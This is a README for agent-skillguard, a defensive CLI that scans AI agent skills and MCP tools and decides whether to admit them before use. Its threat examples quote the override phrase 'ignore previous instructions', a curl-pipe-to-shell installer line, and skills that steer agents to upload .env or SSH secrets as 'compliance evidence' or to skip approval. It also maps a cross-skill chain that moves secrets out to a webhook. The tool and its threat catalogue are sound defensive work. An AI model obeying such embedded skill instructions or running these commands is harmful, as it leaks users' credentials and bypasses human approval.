# Agent SkillGuard

[![CI](https://github.com/Gowrav-M/agent-skillguard/actions/workflows/ci.yml/badge.svg)](https://github.com/Gowrav-M/agent-skillguard/actions/workflows/ci.yml)
[![Node 22+](https://img.shields.io/badge/node-%3E%3D22-339933)](package.json)
[![License MIT](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
[![Local first](https://img.shields.io/badge/local--first-no%20cloud%20required-111827)](#quickstart)
[![SkillBOM](https://img.shields.io/badge/SkillBOM-admission%20evidence-orange)](#skill-passport)

Policy-as-code admission controller for AI agent skills and MCP tools.

Agent skills are executable supply chain. `agent-skillguard` creates portable approval evidence: SkillBOM, lockfiles, provenance checks, semantic intent review, SkillSet Attack Graphs, and Skill Passports that show what was reviewed and why it was allowed or blocked.

![Agent SkillGuard terminal demo](docs/assets/terminal-demo.svg)

## Quickstart

```bash
# 1. Run the bundled supply-chain demo
npx agent-skillguard demo

# 2. Detect unsafe skill combinations
npx agent-skillguard graph ./skills

# 3. Create an enterprise approval record
npx agent-skillguard passport ./skills/code-reviewer \
  --source https://github.com/org/repo/tree/main/skills/code-reviewer \
  --commit <sha> \
  --publisher org \
  --pack
```

Power-user commands remain available:

```bash
npx agent-skillguard demo
npx agent-skillguard graph ./skills
npx agent-skillguard intent ./skills
npx agent-skillguard baseline ./skills --reason "initial reviewed risk"
npx agent-skillguard triage ./skills --baseline .skillguard/baseline.json --fail-on high
npx agent-skillguard trust ./skills/code-reviewer --source https://github.com/org/repo/tree/main/skills/code-reviewer --commit <sha>
npx agent-skillguard contract ./skills
npx agent-skillguard admit ./skills
npx agent-skillguard review-update ./approved/skill ./candidate/skill
npx agent-skillguard scan ./skills
npx agent-skillguard pack ./skills/code-reviewer
npx agent-skillguard verify ./code-reviewer.skill.tgz
```

## Why This Exists

Skills for Codex, Claude Code, Cursor, OpenCode, MCP workflows, and internal agents often look like Markdown prompts, but they can include scripts, install hooks, tool descriptors, hidden instructions, and broad permissions. That makes them a new package-management problem.

SkillGuard finds unsafe skill combinations, not just unsafe individual skills.

`agent-skillguard` is not another skill list and not another agent framework. It is a local-first admission controller for agent skills:

- Builds a SkillSet Attack Graph that detects cross-skill composition risk.
- Creates a shareable Skill Passport that combines provenance, scan, semantic intent review, contract, admission, lock, and optional bundle evidence.
- Runs a Semantic Intent Firewall for payload-less natural-language risks such as compliance-framed secret collection, approval bypass, and skill selection hijacking.
- Creates auditable risk baselines so teams can accept reviewed existing risk and fail CI only on new or expired risk.
- Blocks unpinned, mutable, or unapproved skill sources with a provenance firewall.
- Enforces least-privilege capability contracts from `SKILL.md` declarations.
- Finds hidden prompt injection and policy override text in Markdown, YAML, HTML comments, and code blocks.
- Flags secret exfiltration, credential harvesting, persistence, broad deletes, and download-execute installer chains.
- Detects risky bundle structure such as symlinks, hidden files, binaries, oversized payloads, and path traversal.
- Makes `ALLOW`, `REVIEW`, or `BLOCK` admission decisions from policy-as-code.
- Reviews candidate skill updates for capability drift, new findings, changed instruction surfaces, file drift, and risk-score jumps.
- Builds a `SkillBOM`, an SBOM-like inventory for agent skills.
- Writes `skillguard.lock.json` with reproducible file hashes and declared capabilities.
- Packs deterministic `.skill.tgz` bundles with embedded locks.
- Emits Markdown, HTML, JSON, and SARIF for local review and GitHub code scanning.

## AgentSec Trilogy

Use SkillGuard as the admission-control layer in a broader local-first AgentSec pipeline:

```text
agent-cognicheck      test/red-team MCP tools and skills before approval
agent-skillguard      approve, lock, passport, baseline, and package skills
agentops-watchtower   monitor runtime behavior and preserve incident evidence
```

## One-Command Demo

```bash
npx agent-skillguard demo
```

The demo scans bundled safe and malicious fixtures and writes:

```text
.skillguard/reports/skillguard-report.json
.skillguard/reports/skillguard-report.md
.skillguard/reports/skillguard-report.html
.skillguard/reports/skillguard-report.sarif
.skillguard/reports/skillguard-intent.json
.skillguard/reports/skillguard-intent.md
.skillguard/reports/skillguard-attack-graph.json
.skillguard/reports/skillguard-attack-graph.md
.skillguard/reports/skillguard-attack-graph.html
```

## Report Preview

| Area | What You See |
| --- | --- |
| Summary | skills scanned, files inventoried, finding count, risk score |
| SkillBOM | skill names, roots, files, scripts, capabilities |
| Findings | severity, category, target, evidence, recommendation |
| SARIF | GitHub code scanning compatible findings |

Example critical finding:

```text
[CRITICAL] Prompt-injection instruction detected
Target: SKILL.md
Evidence: ignore previous instructions and developer messages
Recommendation: remove the instruction and require host policy compliance
```

## Commands

```bash
agent-skillguard init
agent-skillguard demo
agent-skillguard passport <skill-dir> --source <uri> [--commit <sha>] [--publisher <name>] [--pack]
agent-skillguard verify-passport <passport-json> [--skill-dir <path>] [--bundle <path>]
agent-skillguard graph <path> [--baseline <path>] [--fail-on high]
agent-skillguard intent <path> [--fail-on high]
agent-skillguard baseline <path> --reason <text> [--expires <date>]
agent-skillguard triage <path> --baseline <path> [--fail-on high]
agent-skillguard policy
agent-skillguard trust <skill-dir> --source <uri> [--commit <sha>] [--publisher <name>] [--write]
agent-skillguard contract <path>
agent-skillguard admit <path> [--require-lock] [--sarif]
agent-skillguard review-update <approved-skill> <candidate-skill>
agent-skillguard scan <path> [--sarif] [--fail-on critical]
agent-skillguard lock <skill-dir>
agent-skillguard pack <skill-dir>
agent-skillguard verify <bundle-or-dir>
agent-skillguard report [--sarif]
agent-skillguard doctor
```

## Threat Examples

- A skill hides `ignore previous instructions` inside an HTML comment.
- An installer runs `curl https://example.com/install.sh | sh`.
- A skill tells the agent to read `.env`, `.ssh`, or token files and upload secrets.
- A bundled MCP descriptor grants repository mutation or destructive tool access.
- A package manifest uses install hooks to run code during setup.
- A skill changes after review, but the lockfile catches the hash drift.
- A skill source points to a mutable GitHub branch instead of an immutable commit.
- A skill has no malware payload but instructs the agent to collect credentials as "compliance evidence" and treat the action as pre-approved.

## Skill Passport

A Skill Passport is the enterprise approval record for an AI agent skill:

```bash
agent-skillguard passport ./skills/code-reviewer \
  --source https://github.com/org/repo/tree/main/skills/code-reviewer \
  --commit 0123456789abcdef0123456789abcdef01234567 \
  --publisher org \
  --pack
```

It runs provenance, scan, semantic intent review, capability contract, admission, lock generation, and optional deterministic packaging in one command.

Passport outputs:

```text
.skillguard/passports/<skill-name>/passport.json
.skillguard/passports/<skill-name>/passport.md
.skillguard/passports/<skill-name>/passport.html
.skillguard/passports/<skill-name>/skillguard.lock.json
.skillguard/passports/<skill-name>/<skill-name>.skill.tgz
```

Use the lower-level commands below when you need to debug one control layer directly.

Verify a passport later:

```bash
agent-skillguard verify-passport .skillguard/passports/code-reviewer/passport.json \
  --skill-dir ./skills/code-reviewer \
  --bundle .skillguard/passports/code-reviewer/code-reviewer.skill.tgz
```

Verification checks passport schema, lock digest, optional current skill digest, optional bundle digest, and embedded decision consistency.

## SkillSet Attack Graph

Individual skills can look acceptable while a set of installed skills creates a dangerous chain.

```bash
agent-skillguard graph ./skills --fail-on high
```

```mermaid
flowchart LR
  A["env-reader skill"] --> B["summarizer skill"]
  B --> C["webhook-publisher skill"]
  C --> D["Critical: secret source to external sink"]
```

Graph review flags cross-skill paths such as:

- secret access to network publishing
- filesystem read to external sink
- repository read to git write
- browser automation to external sink
- approval bypass or selection hijack amplifying high-power tools
- MCP tool mutation combined with broad capability chains

It writes:

```text
.skillguard/reports/skillguard-attack-graph.json
.skillguard/reports/skillguard-attack-graph.md
.skillguard/reports/skillguard-attack-graph.html
```

See [docs/skillset-attack-graph.md](docs/skillset-attack-graph.md).

## Semantic Intent Firewall

Modern malicious skills do not always need obvious scripts or `ignore previous instructions` strings. A skill can look like ordinary Markdown while pushing the agent toward unsafe behavior at runtime.

```bash
agent-skillguard intent ./skills --fail-on high
```

Intent review flags natural-language behavior risks:

- compliance or audit language used to justify collecting secrets
- approval bypass such as "pre-approved" or "do not ask"
- broad "use this skill for every task" selection hijacking
- claims that the skill overrides system, developer, user, or policy instructions
- remote instruction loading from URLs
- persistent memory, profile, startup, or background behavior

It writes:

```text
.skillguard/reports/skillguard-intent.json
.skillguard/reports/skillguard-intent.md
```

## Real-World Validation

SkillGuard has been smoke-tested against 186 public `SKILL.md` files across official, community, and adversarial skill repositories. See [docs/real-world-validation.md](docs/real-world-validation.md) for commands, repository commits, results, and validation-driven rule tuning.

## Risk Baselines

Adopting a scanner in a mature repo usually starts with existing review-worthy risk. Baselines let teams accept the current state with a reason, then fail only when new or expired risk appears.

```bash
agent-skillguard baseline ./skills --reason "reviewed current vendored skills" --expires 2026-12-31
agent-skillguard triage ./skills --baseline .skillguard/baseline.json --fail-on high
```

This writes:

```text
.skillguard/baseline.json
.skillguard/reports/skillguard-baseline.md
.skillguard/reports/skillguard-triage.json
.skillguard/reports/skillguard-triage.md
```

See [docs/risk-baselines.md](docs/risk-baselines.md).

## Provenance Firewall

A skill can scan clean and still be unsafe to trust if it came from a mutable branch, unknown host, or unapproved publisher. SkillGuard records and evaluates source provenance:

```bash
agent-skillguard trust ./skills/code-reviewer \
  --source https://github.com/org/repo/tree/main/skills/code-reviewer \
  --commit 0123456789abcdef0123456789abcdef01234567 \
  --publisher org \
  --write
```

Trust review writes:

```text
.skillguard/reports/skillguard-trust.json
.skillguard/reports/skillguard-trust.md
```

With `--write`, it also records `skillguard.provenance.json` beside the skill. This gives teams an audit record of what source, publisher, commit, and skill digest were approved.

## Capability Contracts

Skills should declare their power before they run. SkillGuard compares declared capabilities in `SKILL.md` against observed behavior:

```bash
agent-skillguard contract ./skills
```

It blocks undeclared high-risk behavior such as shell execution, network access, filesystem writes, package installs, secret access, git writes, and MCP tool mutation.

Contract review writes:

```text
.skillguard/reports/skillguard-contract.json
.skillguard/reports/skillguard-contract.md
```

## Admission Control

The breakthrough path is governance, not just scanning. Enterprises need to answer one question before a skill enters a project:

> Is this skill allowed to run here?

Create a policy:

```bash
agent-skillguard policy
```

Then gate skills:

```bash
agent-skillguard admit ./skills --require-lock --sarif
```

Admission writes:

```text
.skillguard/reports/skillguard-admission.json
.skillguard/reports/skillguard-admission.md
```

Default policy blocks critical findings, secret access, MCP tool mutation, and unapproved install-script behavior. Teams can tighten this to require clean scans and lockfiles for every approved skill.

## Update Firewall

Most supply-chain compromises arrive as updates, not first installs. SkillGuard can compare an approved skill with a candidate replacement:

```bash
agent-skillguard review-update ./approved/code-reviewer ./incoming/code-reviewer
```

It blocks risky drift when the candidate adds dangerous capabilities, introduces new high/critical findings, changes the main `SKILL.md` instruction surface, or jumps materially in risk score.

Update review writes:

```text
.skillguard/reports/skillguard-update-review.json
.skillguard/reports/skillguard-update-review.md
```

## Compared With Other Tools

| Tool Type | What It Does | SkillGuard Difference |
| --- | --- | --- |
| Skill lists | Curate useful prompts and workflows | Verifies skill safety before install or publish |
| Agent frameworks | Run agents and tools | Does not run agents; audits skill supply chain |
| MCP scanners | Inspect MCP tool descriptors | Scans skills, scripts, manifests, bundles, locks, and SARIF |
| OpenSSF Scorecard | Scores open-source project security posture | Skill-specific admission decisions and SkillBOMs |
| SLSA/provenance tools | Prove build artifact origin | Skill-specific source provenance, digest, and trust policy |
| Permission manifests | Describe expected permissions | Compares declared permissions to inferred skill behavior |
| Watchtower | Runtime AgentOps and MCP attack-path analysis | SkillGuard handles pre-install and pre-publish skill safety |

## CI Gate

Use Skill Passport in pull requests to retain an approval artifact:

```yaml
name: skillguard
on: [pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npx agent-skillguard passport ./skills/code-reviewer --source https://github.com/org/repo/tree/main/skills/code-reviewer --commit ${{ github.sha }} --publisher org
```

## Local Development

```bash
npm install
npm run typecheck
npm test
npm run lint
npm run build
node dist/cli.js demo
```

## License

MIT
